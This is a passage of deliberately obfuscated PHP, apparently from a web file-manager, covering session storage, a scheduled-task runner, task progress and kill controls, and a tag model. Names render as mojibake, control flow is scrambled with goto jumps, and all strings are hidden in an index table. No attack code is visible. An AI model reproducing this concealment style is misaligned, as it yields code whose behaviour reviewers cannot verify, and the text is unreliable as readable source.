$_SERVER[™⁄»üÆ]; static $BŸ·©ø“ÈÕ = false; if ($BŸ·©ø“ÈÕ) { return $BŸ·©ø“ÈÕ; } goto d¶Öàëîâæ; A∂¯É·ÑÎÓ: } public static function sign($b€œËÌæ„≈ = false) { $b€œËÌæ„≈ && (self::$sessionSign = $b€œËÌæ„≈); self::init(); return self::$sessionSign; } public static function set($dÍÌº€«ﬂò, $fÍ¯¡ü¬≠÷ = false) { self::init(); if (is_array($dÍÌº€«ﬂò)) { foreach ($dÍÌº€«ﬂò as $Dìı†Ç«›— => $FÈ—üÔ‰°´) { array_set_value(self::$data, $Dìı†Ç«›—, $FÈ—üÔ‰°´); } } else { array_set_value(self::$data, $dÍÌº€«ﬂò, $fÍ¯¡ü¬≠÷); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($b¶èô¿„„à = false) { self::init(); if (!$b¶èô¿„„à) { return self::$data; } return array_get_value(self::$data, $b¶èô¿„„à); } public static function remove($eø°Ñä∂µ≈) { self::init(); unset(self::$data[$eø°Ñä∂µ≈]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[™⁄»üÆ][817])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto FÛ®º—Ÿ¨í; FÛ®º—Ÿ¨í: $bë‡ÙßÊÒ” =& $_SERVER[™⁄»üÆ]; if (self::valueGet($bë‡ÙßÊÒ”[729]) != $bë‡ÙßÊÒ”[87]) { return; } if (self::valueGet($bë‡ÙßÊÒ”[1500]) == $bë‡ÙßÊÒ”[87]) { $aµ∞Ñ⁄Ωèê = self::valueGet($bë‡ÙßÊÒ”[1501]); if (time() - $aµ∞Ñ⁄Ωèê > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto c›∑™Ÿ ÇÏ; c›∑™Ÿ ÇÏ: http_close(); self::valueSet($bë‡ÙßÊÒ”[1500], $bë‡ÙßÊÒ”[87]); Hook::bind($bë‡ÙßÊÒ”[1502], $bë‡ÙßÊÒ”[1503]); goto d¨É‹¨ÒÿÖ; d¨É‹¨ÒÿÖ: while (!0) { self::cacheClear(); if (self::valueGet($bë‡ÙßÊÒ”[729]) != $bë‡ÙßÊÒ”[87]) { self::valueSet($bë‡ÙßÊÒ”[1500], $bë‡ÙßÊÒ”[191]); self::log($bë‡ÙßÊÒ”[1504]); die; } self::valueSet($bë‡ÙßÊÒ”[1500], $bë‡ÙßÊÒ”[87]); self::valueSet($bë‡ÙßÊÒ”[1501], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto f±äÑà∫æ«; f±äÑà∫æ«: } public static function restart() { $F±˜∞’™Úç =& $_SERVER[™⁄»üÆ]; http_close(); self::valueSet($F±˜∞’™Úç[729], $F±˜∞’™Úç[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($F±˜∞’™Úç[1500], $F±˜∞’™Úç[191]); self::valueSet($F±˜∞’™Úç[729], $F±˜∞’™Úç[87]); } public static function shutdownEvent() { $cˆ’≈ßäç´ =& $_SERVER[™⁄»üÆ]; self::valueSet($cˆ’≈ßäç´[1500], $cˆ’≈ßäç´[191]); self::log($cˆ’≈ßäç´[1505]); } public static function config($BíøêôÇ≤Ó, $a‰úÈáä…Ù) { self::valueSet($_SERVER[™⁄»üÆ][729], $BíøêôÇ≤Ó); } private static function taskRunAll() { goto a◊¡ƒÀ∏“≥; Dãã©ÖÑæ∑: self::taskQueueRun($EÊµ‚‘∞√Ò); goto Dí¿™∆≥ì–; Eë¶Àƒëùå: $cÙﬁóö£âµ = count($E‡∆åÊÌ∫¯); for ($aÎ≤å£¥¥Á = 0; $aÎ≤å£¥¥Á < $cÙﬁóö£âµ; $aÎ≤å£¥¥Á++) { $aÉöÊıÇ„‘ = $E‡∆åÊÌ∫¯[$aÎ≤å£¥¥Á]; if (!$aÉöÊıÇ„‘[$c‰ø—êÓ£À[394]] || $aÉöÊıÇ„‘[$c‰ø—êÓ£À[1507]] != $c‰ø—êÓ£À[87]) { continue; } if (!self::taskTimeCheck($aÉöÊıÇ„‘)) { continue; } self::taskRun($aÉöÊıÇ„‘); } Hook::trigger($c‰ø—êÓ£À[1508]); goto Dãã©ÖÑæ∑; a◊¡ƒÀ∏“≥: $c‰ø—êÓ£À =& $_SERVER[™⁄»üÆ]; $EÊµ‚‘∞√Ò = timeFloat(); $E‡∆åÊÌ∫¯ = Model($c‰ø—êÓ£À[1506])->listData(); goto Eë¶Àƒëùå; Dí¿™∆≥ì–: } private static function taskQueueRun($A‘≤ä˜Ñ—ñ) { $aØÖ’ë®ﬂÂ = 10; while (!0) { $d„÷ëŒµÎ‹ = TaskQueue::run(); if ($d„÷ëŒµÎ‹ === !1) { break; } if (timeFloat() - $A‘≤ä˜Ñ—ñ >= $aØÖ’ë®ﬂÂ) { break; } } } private static function taskTimeCheck($EÉè´†àÖõ) { goto c‹ôﬂ÷à∞ı; c£€ªæﬂıª: switch ($BæœÏ˜∑£„[$BáºıõÕòΩ[29]]) { case $BáºıõÕòΩ[1515]: if (time() - $DÇî€¯‘Ñÿ < 3600 * 24 * 30) { return !1; } if ($BæœÏ˜∑£„[$BáºıõÕòΩ[1515]] == date($BáºıõÕòΩ[1516]) && $BéÉ ô«˜¡) { return !0; } break; case $BáºıõÕòΩ[1517]: if (time() - $DÇî€¯‘Ñÿ < 3600 * 24 * 7) { return !1; } $B›œ‰Æ˘ÃÀ = date($BáºıõÕòΩ[1518]) == 0 ? 7 : date($BáºıõÕòΩ[1518]); if ($BæœÏ˜∑£„[$BáºıõÕòΩ[1517]] == $B›œ‰Æ˘ÃÀ && $BéÉ ô«˜¡) { return !0; } break; case $BáºıõÕòΩ[1510]: if (time() - $DÇî€¯‘Ñÿ < 3600 * 24) { return !1; } if ($BéÉ ô«˜¡) { return !0; } break; case $BáºıõÕòΩ[1519]: if (time() - $DÇî€¯‘Ñÿ >= floatval($BæœÏ˜∑£„[$BáºıõÕòΩ[1519]]) * 60) { return !0; } break; default: break; } return !1; goto Cƒâ§àØ◊≠; fæ¿æî≠Ωê: $d±ﬁÑ÷¢≥ß = strtotime($BáºıõÕòΩ[1509] . $BæœÏ˜∑£„[$BáºıõÕòΩ[1510]] . $BáºıõÕòΩ[1511]) - strtotime($BáºıõÕòΩ[1512]); $aå∫˘ºÒÎå = time() - strtotime(date($BáºıõÕòΩ[1513]) . $BáºıõÕòΩ[1514]); $BéÉ ô«˜¡ = $aå∫˘ºÒÎå >= $d±ﬁÑ÷¢≥ß && $aå∫˘ºÒÎå <= $d±ﬁÑ÷¢≥ß + 3600; goto c£€ªæﬂıª; c‹ôﬂ÷à∞ı: $BáºıõÕòΩ =& $_SERVER[™⁄»üÆ]; $BæœÏ˜∑£„ = json_decode($EÉè´†àÖõ[$BáºıõÕòΩ[197]], !0); $DÇî€¯‘Ñÿ = intval($EÉè´†àÖõ[$BáºıõÕòΩ[1501]]); goto fæ¿æî≠Ωê; Cƒâ§àØ◊≠: } private static function closeDatabase() { goto bÁ®—¢µÓ»; E‚¯Çºç¿: $Cä·Ë˘ÛÁ· = Model($A°ËÚãé›˘[495])->db($A°ËÚãé›˘[33]); if ($Cä·Ë˘ÛÁ·) { $Cä·Ë˘ÛÁ·->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($A°ËÚãé›˘[1520], $A°ËÚãé›˘[1521]); die; } goto EçŒéÖ∆√ÿ; b≠€õœÉ «: if (!$bÿåÊ±Ÿä†) { $bÿåÊ±Ÿä† = time(); } if (time() - $bÿåÊ±Ÿä† < $Bı¿”Õ«Ö–) { return; } $bÿåÊ±Ÿä† = time(); goto E‚¯Çºç¿; bÁ®—¢µÓ»: $A°ËÚãé›˘ =& $_SERVER[™⁄»üÆ]; static $bÿåÊ±Ÿä† = 0; $Bı¿”Õ«Ö– = 300; goto b≠€õœÉ «; EçŒéÖ∆√ÿ: } public static function taskRun($a⁄âﬁ£∆ıÙ) { goto fñÁßƒÈÊí; fñÁßƒÈÊí: $e∆é¨¬¿÷∏ =& $_SERVER[™⁄»üÆ]; self::log($e∆é¨¬¿÷∏[1522] . $a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[394]] . $e∆é¨¬¿÷∏[1523] . $a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[28]] . $e∆é¨¬¿÷∏[1524] . $a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[1525]]); Model($e∆é¨¬¿÷∏[1506])->run($a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[394]]); goto Dáòàªâ§è; bÕàõòæû—: return !0; goto Aå›É≤Û∑„; Dáòàªâ§è: $a∫øÊÇãÉê = timeFloat(); $Fíé„§¨ºê = $e∆é¨¬¿÷∏[33]; switch ($a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[29]]) { case $e∆é¨¬¿÷∏[305]: $EƒÑƒ∑∞≤À = url_request($a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[1525]], $e∆é¨¬¿÷∏[228], !1, !1, !1, !1, 10); if ($EƒÑƒ∑∞≤À[$e∆é¨¬¿÷∏[729]]) { $Fíé„§¨ºê = strlen($EƒÑƒ∑∞≤À[$e∆é¨¬¿÷∏[1096]]); } break; case $e∆é¨¬¿÷∏[227]: $Fíé„§¨ºê = Hook::apply($a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[1525]]); default: break; } goto Båï‹Ã±…π; Båï‹Ã±…π: Model($e∆é¨¬¿÷∏[1526])->add(array($e∆é¨¬¿÷∏[1527] => $e∆é¨¬¿÷∏[33], $e∆é¨¬¿÷∏[1528] => $e∆é¨¬¿÷∏[191], $e∆é¨¬¿÷∏[29] => $e∆é¨¬¿÷∏[1529] . $a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[394]], $e∆é¨¬¿÷∏[1530] => json_encode(array($e∆é¨¬¿÷∏[28] => $a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[28]], $e∆é¨¬¿÷∏[1531] => timeFloat() - $a∫øÊÇãÉê, $e∆é¨¬¿÷∏[291] => $Fíé„§¨ºê)))); $b†¨êàîùÓ = $Fíé„§¨ºê ? $e∆é¨¬¿÷∏[1532] . $Fíé„§¨ºê : $e∆é¨¬¿÷∏[33]; self::log($e∆é¨¬¿÷∏[1533] . $a⁄âﬁ£∆ıÙ[$e∆é¨¬¿÷∏[394]] . $e∆é¨¬¿÷∏[518] . $b†¨êàîùÓ); goto bÕàõòæû—; Aå›É≤Û∑„: } private static function valueGet($eâ£∞ÙÖ–Ω) { $a·¯÷œ—ñ =& $_SERVER[™⁄»üÆ]; $eéüÂƒç˜á = $a·¯÷œ—ñ[1534]; $eëêÖ¿Á¶Ö = Model($a·¯÷œ—ñ[487])->get($eâ£∞ÙÖ–Ω, $eéüÂƒç˜á); if (is_null($eëêÖ¿Á¶Ö)) { Model($a·¯÷œ—ñ[487])->set($a·¯÷œ—ñ[729], $a·¯÷œ—ñ[87], $eéüÂƒç˜á); Model($a·¯÷œ—ñ[487])->set($a·¯÷œ—ñ[1500], $a·¯÷œ—ñ[191], $eéüÂƒç˜á); $eëêÖ¿Á¶Ö = Model($a·¯÷œ—ñ[487])->get($eâ£∞ÙÖ–Ω, $eéüÂƒç˜á); } return $eëêÖ¿Á¶Ö; } private static function valueSet($A§ÁÏçó«å, $d™∆úî≤£∂) { $eÍÔ∆Ò…¡Ã =& $_SERVER[™⁄»üÆ]; $dè¬æ…ÛÛ¿ = $eÍÔ∆Ò…¡Ã[1535]; CacheLock::lock($dè¬æ…ÛÛ¿); $dúëπ¨ÕÈË = Model($eÍÔ∆Ò…¡Ã[487])->set($A§ÁÏçó«å, $d™∆úî≤£∂, $eÍÔ∆Ò…¡Ã[1534]); CacheLock::unlock($dè¬æ…ÛÛ¿); return $dúëπ¨ÕÈË; } protected static function log($d®ÆËùîŒä) { write_log($d®ÆËùîŒä, $_SERVER[™⁄»üÆ][1521]); } private static function cacheClear() { $Eãô¡ŸÂØ¯ =& $_SERVER[™⁄»üÆ]; Cache::clearMemory(Model($Eãô¡ŸÂØ¯[487])->cacheKey($Eãô¡ŸÂØ¯[1534])); Cache::clearMemory(Model($Eãô¡ŸÂØ¯[487])->cacheKey($Eãô¡ŸÂØ¯[1536])); Model($Eãô¡ŸÂØ¯[1506])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\162\x75\156\156\151\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($AñÜÖò ¶ë, $aÜôÒÀ◊„⁄ = '', $b«áΩÍÉßº = 0, $EﬁÆàá„§ß = '') { goto AóÙûºóÜﬂ; AóÙûºóÜﬂ: $a°É°° Óì =& $_SERVER[™⁄»üÆ]; if (self::get($AñÜÖò ¶ë)) { return; } $this->task = array($a°É°° Óì[394] => $AñÜÖò ¶ë, $a°É°° Óì[1537] => USER_ID, $a°É°° Óì[1440] => $EﬁÆàá„§ß, $a°É°° Óì[29] => $aÜôÒÀ◊„⁄, $a°É°° Óì[1032] => $a°É°° Óì[33], $a°É°° Óì[1030] => $b«áΩÍÉßº, $a°É°° Óì[1044] => 0, $a°É°° Óì[1538] => 0, $a°É°° Óì[1539] => 0, $a°É°° Óì[768] => timeFloat(), $a°É°° Óì[767] => 0, $a°É°° Óì[1540] => 0, $a°É°° Óì[1541] => 0, $a°É°° Óì[1542] => 0, $a°É°° Óì[729] => $a°É°° Óì[1500]); goto EöÛ∂óÉ‚æ; E¢≠ûäèÏÛ: $this->startAfter(); Hook::trigger($a°É°° Óì[1547], $this->task); $this->task[$a°É°° Óì[1540]] = timeFloat(); goto Eó≈¶—©ü≥; EöÛ∂óÉ‚æ: $GLOBALS[$a°É°° Óì[1543]] = 1; Hook::bind($a°É°° Óì[1502], array($this, $a°É°° Óì[1544])); Hook::bind($a°É°° Óì[1545], array($this, $a°É°° Óì[1546])); goto E¢≠ûäèÏÛ; Eó≈¶—©ü≥: } public function end() { goto F“ÆÕü‘ÿº; CëÊà®–Á: Hook::unbind($CÜ√£¥ÖÑ÷[1545], array($this, $CÜ√£¥ÖÑ÷[1546])); $this->endAfter(); $this->task = !1; goto fÇ©É»ä∞≠; F“ÆÕü‘ÿº: $CÜ√£¥ÖÑ÷ =& $_SERVER[™⁄»üÆ]; if (!$this->task) { return; } if ($this->task[$CÜ√£¥ÖÑ÷[1540]]) { self::valueSet($this->task[$CÜ√£¥ÖÑ÷[394]], !1); } goto dî∑¿°ßâ§; dî∑¿°ßâ§: $AªÃá√¶äß = timeFloat() - $this->task[$CÜ√£¥ÖÑ÷[768]]; self::log($CÜ√£¥ÖÑ÷[1548] . $this->task[$CÜ√£¥ÖÑ÷[394]] . $CÜ√£¥ÖÑ÷[1549] . $AªÃá√¶äß . $CÜ√£¥ÖÑ÷[1550]); Hook::unbind($CÜ√£¥ÖÑ÷[1502], array($this, $CÜ√£¥ÖÑ÷[1544])); goto CëÊà®–Á; fÇ©É»ä∞≠: } public function update($B∆¡˘ÇÃ◊ƒ = 0, $f ‚ò±»ñı = false) { goto Cßå¿Ìà„Ü; CëÚ“Ó‘îè: $c«ΩÉ–‹≤» = self::get($a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[394]]); $F˜∑âüÖåÒ = $c«ΩÉ–‹≤»[$e©ﬂá∏ø∑∑[729]]; if ($F˜∑âüÖåÒ == self::STATYS_KILL) { $dŸÊõÒ◊Ô… = array($e©ﬂá∏ø∑∑[1551] => LNG($e©ﬂá∏ø∑∑[1552]), $e©ﬂá∏ø∑∑[1094] => !1); Cache::set($e©ﬂá∏ø∑∑[1553] . $this->task[$e©ﬂá∏ø∑∑[394]], $dŸÊõÒ◊Ô…, 30); $this->onKill(); $this->end(); die; } else { if ($F˜∑âüÖåÒ == self::STATYS_STOP) { $aÂüıéö¶‹ = 2; $c«ΩÉ–‹≤»[$e©ﬂá∏ø∑∑[1541]] += $aÂüıéö¶‹; self::valueSet($a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[394]], $c«ΩÉ–‹≤»); sleep($aÂüıéö¶‹); $this->update(); return; } } goto c⁄ÙÈ∑¬∆£; Cßå¿Ìà„Ü: $e©ﬂá∏ø∑∑ =& $_SERVER[™⁄»üÆ]; $a∫Ê·Çí“— =& $this->task; if (!$a∫Ê·Çí“—) { return; } goto DﬂŒ‹’ÔŒ√; DﬂŒ‹’ÔŒ√: $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1044]] += $B∆¡˘ÇÃ◊ƒ; $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[767]] = timeFloat(); if ($a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1030]]) { if ($a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1030]] < $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1044]]) { $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1030]] = $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1044]]; } $fö¡¯äÛ∏À = timeFloat() - $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[768]] - $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1541]]; $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1538]] = $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1044]] / $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1030]]; $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1539]] = $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1044]] / $fö¡¯äÛ∏À; if ($a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1538]] > 0) { $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1542]] = $fö¡¯äÛ∏À * (1 - $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1538]]) / $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1538]]; } $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1542]] = $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1542]] <= 0 ? 0 : $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1542]]; } goto cûà∆±áò„; cûà∆±áò„: $this->updateAfter(); $bØó˘ë·›ç = 0.2; if (timeFloat() - $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1540]] < $bØó˘ë·›ç && !$f ‚ò±»ñı) { return; } goto CëÚ“Ó‘îè; c⁄ÙÈ∑¬∆£: $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[729]] = $F˜∑âüÖåÒ ? $F˜∑âüÖåÒ : $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[729]]; $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1541]] = $c«ΩÉ–‹≤»[$e©ﬂá∏ø∑∑[1541]] ? $c«ΩÉ–‹≤»[$e©ﬂá∏ø∑∑[1541]] : 0; $a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[1540]] = timeFloat(); goto Bﬁ¡—¥™àÿ; Bﬁ¡—¥™àÿ: Hook::trigger($e©ﬂá∏ø∑∑[1554], $a∫Ê·Çí“—); self::valueSet($a∫Ê·Çí“—[$e©ﬂá∏ø∑∑[394]], $a∫Ê·Çí“—); goto EúÇè‹√£—; EúÇè‹√£—: } public function onKillSet($D”Íì›à⁄ò, $AùŸ¢›ê√é = array()) { $this->onKillCall = array($D”Íì›à⁄ò, $AùŸ¢›ê√é); } public function onKill() { $d⁄Æ‹π°‚Ñ =& $_SERVER[™⁄»üÆ]; self::log($d⁄Æ‹π°‚Ñ[1548] . $this->task[$d⁄Æ‹π°‚Ñ[394]] . $d⁄Æ‹π°‚Ñ[1555]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($BæÊê•º¬∆) { $FÈ¿∫ÈÎ◊ô =& $_SERVER[™⁄»üÆ]; Cache::set($FÈ¿∫ÈÎ◊ô[1553] . $this->task[$FÈ¿∫ÈÎ◊ô[394]], $BæÊê•º¬∆, 60); return $BæÊê•º¬∆; } public static function get($fÖ˘ñ´·‡°) { $dí¿ùŸÚÉõ =& $_SERVER[™⁄»üÆ]; $E¯Ωõ Ïﬂ∏ = self::valueGet($fÖ˘ñ´·‡°); if (is_array($E¯Ωõ Ïﬂ∏) && $E¯Ωõ Ïﬂ∏[$dí¿ùŸÚÉõ[1556]]) { $E¯Ôßñ–ä = ActionApply($E¯Ωõ Ïﬂ∏[$dí¿ùŸÚÉõ[1556]], array($E¯Ωõ Ïﬂ∏)); $E¯Ωõ Ïﬂ∏ = is_array($E¯Ôßñ–ä) ? $E¯Ôßñ–ä : $E¯Ωõ Ïﬂ∏; } return $E¯Ωõ Ïﬂ∏; } public static function listData() { $d∞Ï∂ÊêèÂ = self::valueGet(); return array_sort_by($d∞Ï∂ÊêèÂ, $_SERVER[™⁄»üÆ][768], !0); } public static function kill($a∑›õ∫‹Õì) { return self::changeStatus($a∑›õ∫‹Õì, self::STATYS_KILL); } public static function stop($fœá•ïîÎ“) { return self::changeStatus($fœá•ïîÎ“, self::STATYS_STOP); } public static function restart($Eë›ëÿ€ÕÆ) { return self::changeStatus($Eë›ëÿ€ÕÆ, self::STATYS_RUNNING); } public static function killAll() { $AñﬁﬂÿıŒÜ =& $_SERVER[™⁄»üÆ]; $bÑùé‡»Ë´ = self::listData(); foreach ($bÑùé‡»Ë´ as $bß·™Ï˜‚î) { self::kill($bß·™Ï˜‚î[$AñﬁﬂÿıŒÜ[394]]); } sleep(2); foreach ($bÑùé‡»Ë´ as $bß·™Ï˜‚î) { self::valueSet($bß·™Ï˜‚î[$AñﬁﬂÿıŒÜ[394]], !1); } } private static function changeStatus($báêÁ–∆Æ›, $fÚ¨ñøË ) { goto A∏ÜøåÀÏ≤; Dû„¥‚µÒ§: $D˘÷ñá≠à…[$AÖ«≤äâáê[729]] = $fÚ¨ñøË ; self::valueSet($báêÁ–∆Æ›, $D˘÷ñá≠à…); self::log($AÖ«≤äâáê[1557] . $D˘÷ñá≠à…[$AÖ«≤äâáê[394]] . $AÖ«≤äâáê[1558] . $fÚ¨ñøË ); goto e‡ü“Ü…∞ø; e‡ü“Ü…∞ø: return !0; goto a≥ﬁÕìÍ¡Ï; A∏ÜøåÀÏ≤: $AÖ«≤äâáê =& $_SERVER[™⁄»üÆ]; $D˘÷ñá≠à… = self::valueGet($báêÁ–∆Æ›); if (!$D˘÷ñá≠à…) { return !1; } goto Dû„¥‚µÒ§; a≥ﬁÕìÍ¡Ï: } public static function valueGet($B≥—¢¢Ïã≠ = false) { $dÓ…∑ÂïÑﬂ =& $_SERVER[™⁄»üÆ]; if ($B≥—¢¢Ïã≠) { $dÃâ§ÎÀ¥ = Model($dÓ…∑ÂïÑﬂ[426])->where(array($dÓ…∑ÂïÑﬂ[93] => $B≥—¢¢Ïã≠, $dÓ…∑ÂïÑﬂ[29] => $dÓ…∑ÂïÑﬂ[1559]))->find(); return $dÃâ§ÎÀ¥ ? json_decode($dÃâ§ÎÀ¥[$dÓ…∑ÂïÑﬂ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($F—è∑ú¨±¥ = false) { goto eÓí·¢–»∏; eÓí·¢–»∏: $fŒÓ∫æãßõ =& $_SERVER[™⁄»üÆ]; $BÃπ£¿Àïæ = array($fŒÓ∫æãßõ[29] => $fŒÓ∫æãßõ[1559]); if ($F—è∑ú¨±¥) { $BÃπ£¿Àïæ[$fŒÓ∫æãßõ[1537]] = $F—è∑ú¨±¥; } goto FôèÑ±éó≈; FôèÑ±éó≈: $d“âäË£Éß = Model($fŒÓ∫æãßõ[426])->where($BÃπ£¿Àïæ)->select(); $d“âäË£Éß = $d“âäË£Éß ? $d“âäË£Éß : array(); foreach ($d“âäË£Éß as $c…¢ÇéÒ¨› => $fØêÕä£‰à) { $d“âäË£Éß[$c…¢ÇéÒ¨›] = json_decode($fØêÕä£‰à[$fŒÓ∫æãßõ[372]], !0); } goto c‚°¨çÇüÇ; c‚°¨çÇüÇ: return $d“âäË£Éß; goto E¬âåÜ∞ñπ; E¬âåÜ∞ñπ: } public static function valueSet($Dâ¯˘òûõÉ, $b¢Ò‘±ñÎ‚) { goto C’”ﬁ∏ÏÌ¯; DÌé’¶ì∏ÿ: if (!$b‹ÊØ⁄Ííû) { ob_start(); var_dump($b¢Ò‘±ñÎ‚); $b®¬åë“îé = ob_get_clean(); self::log($D∞öÎ™€µØ[1560] . json_encode_force($b®¬åë“îé)); } if (!$Dâ¯˘òûõÉ || !$b¢Ò‘±ñÎ‚[$D∞öÎ™€µØ[394]]) { return !1; } $B‚â«Ω»éµ = array($D∞öÎ™€µØ[29] => $D∞öÎ™€µØ[1559], $D∞öÎ™€µØ[1537] => USER_ID, $D∞öÎ™€µØ[93] => $Dâ¯˘òûõÉ, $D∞öÎ™€µØ[372] => $b‹ÊØ⁄Ííû); goto Cƒ·áëä√Æ; B¡Ã»´¶Ω⁄: CacheLock::unlock($A∑ÑÇæÚ‘Â); goto d‚πŸ—£î»; C’”ﬁ∏ÏÌ¯: $D∞öÎ™€µØ =& $_SERVER[™⁄»üÆ]; if (!$b¢Ò‘±ñÎ‚) { return Model($D∞öÎ™€µØ[426])->where(array($D∞öÎ™€µØ[93] => $Dâ¯˘òûõÉ, $D∞öÎ™€µØ[29] => $D∞öÎ™€µØ[1559]))->delete(); } $b‹ÊØ⁄Ííû = json_encode($b¢Ò‘±ñÎ‚); goto DÌé’¶ì∏ÿ; Cƒ·áëä√Æ: $A∑ÑÇæÚ‘Â = $D∞öÎ™€µØ[1561]; CacheLock::lock($A∑ÑÇæÚ‘Â); Model($D∞öÎ™€µØ[426])->add($B‚â«Ω»éµ, array(), !0); goto B¡Ã»´¶Ω⁄; d‚πŸ—£î»: } public static function log($aéª◊ç‹∆ß) { if (!GLOBAL_DEBUG) { return; } write_log($aéª◊ç‹∆ß, $_SERVER[™⁄»üÆ][1562]); } } goto DçŒ‘Ë≤ôë; aíÈÈ˘€∂‘: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($e∞Ã∫⁄“¢©) { $b˘º±¢ùﬂ± =& $_SERVER[™⁄»üÆ]; return array($b˘º±¢ùﬂ±[1813] => array(USER_ID, $b˘º±¢ùﬂ±[1814])); } protected function listData() { $aÙÂÙÇ≈ÑÓ =& $_SERVER[™⁄»üÆ]; $f èµ‰üâª = array($aÙÂÙÇ≈ÑÓ[1528] => USER_ID, $aÙÂÙÇ≈ÑÓ[464] => array($aÙÂÙÇ≈ÑÓ[1817], 0)); $EˆËÉÏ◊ìç = $aÙÂÙÇ≈ÑÓ[1819]; $e¡⁄ùﬁñÔŒ = $this->field($EˆËÉÏ◊ìç)->where($f èµ‰üâª)->order($aÙÂÙÇ≈ÑÓ[1820])->select(); return $e¡⁄ùﬁñÔŒ ? $e¡⁄ùﬁñÔŒ : array(); } protected function listByTag($d¬Æ‹âÛ›ˆ) { } protected function addToTag($aÕ™‘ÇÇ•‡, $B∞òàÇƒ—é) { $D∫áç‹¥éÏ =& $_SERVER[™⁄»üÆ]; if (!Model($D∫áç‹¥éÏ[1954])->listData($B∞òàÇƒ—é) || !Model($D∫áç‹¥éÏ[809])->pathInfo($aÕ™‘ÇÇ•‡)) { return !1; } $B»…„öÁ§≈ = array($D∫áç‹¥éÏ[1528] => USER_ID, $D∫áç‹¥éÏ[464] => $B∞òàÇƒ—é, $D∫áç‹¥éÏ[415] => $aÕ™‘ÇÇ•‡, $D∫áç‹¥éÏ[416] => $D∫áç‹¥éÏ[410], $D∫áç‹¥éÏ[414] => $D∫áç‹¥éÏ[33], $D∫áç‹¥éÏ[1710] => 0); if ($this->where($B»…„öÁ§≈)->find()) { return !1; } return $this->add($B»…„öÁ§≈); } protected function removeFromTag($c´É¥∏‡ø´, $CëÊ£ü·«À) { $dﬂñÒ«ã˘Ì =& $_SERVER[™⁄»üÆ]; if (!Model($dﬂñÒ«ã˘Ì[1954])->listData($CëÊ£ü·«À)) { return !1; } if (is_array($c´É¥∏‡ø´)) { $c´É¥∏‡ø´ = array($dﬂñÒ«ã˘Ì[7], $c´É¥∏‡ø´); } $a¿‰´‰ÚÏ• = array($dﬂñÒ«ã˘Ì[1528] => USER_ID, $dﬂñÒ«ã˘Ì[464] => $CëÊ£ü·«À, $dﬂñÒ«ã˘Ì[416] => $dﬂñÒ«ã˘Ì[410], $dﬂñÒ«ã˘Ì[415] => $c´É¥∏‡ø´); return $this->where($a¿‰´‰ÚÏ•)->delete(); } protected function removeByTag($AÜ√˜©≈◊•) { $dàã≈†âœ† =& $_SERVER[™⁄»üÆ]; if (!$AÜ√˜©≈◊•) { return !1; } $añı‚Á√∫ã = array($dàã≈†âœ†[1528] => USER_ID, $dàã≈†âœ†[464] => $AÜ√˜©≈◊•); return $this->where($añı‚Á√∫ã)->delete(); } protected function removeBySource($D»ó®àÚâı) { $B’ƒ’µﬂÍÃ =& $_SERVER[™⁄»üÆ]; if (is_array($D»ó®àÚâı)) { $D»ó®àÚâı = array($B’ƒ’µﬂÍÃ[7], $D»ó®àÚâı); } $f≤™ıœöπ‹ = 